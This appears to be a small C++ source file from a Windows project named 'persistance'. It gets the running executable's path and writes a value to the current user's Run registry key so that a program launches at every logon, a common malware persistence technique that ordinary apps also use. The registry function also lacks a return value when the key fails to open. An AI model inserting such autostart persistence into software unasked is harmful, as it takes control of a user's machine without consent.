//
// Created by kibkib on 22.10.2023.
//
#include "persistance.h"

std::string get_exe_path() {
    char buffer[MAX_PATH];
    GetModuleFileName(NULL, buffer, MAX_PATH);
    return std::string(buffer);
}

bool AddToStartupRegistry(const std::string &value_name, const std::string &value_data) {
    HKEY hKey;

    const char *subKey = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";

    if (RegOpenKeyEx(HKEY_CURRENT_USER, subKey, 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        if (RegSetValueEx(hKey, value_name.c_str(), 0, REG_SZ,
                          reinterpret_cast<BYTE *>(const_cast<char *>(value_data.c_str())), value_data.size() + 1) ==
            ERROR_SUCCESS) {
            RegCloseKey(hKey);
            return true;
        }
        else{
            RegCloseKey(hKey);
            return false;
        }
    }
}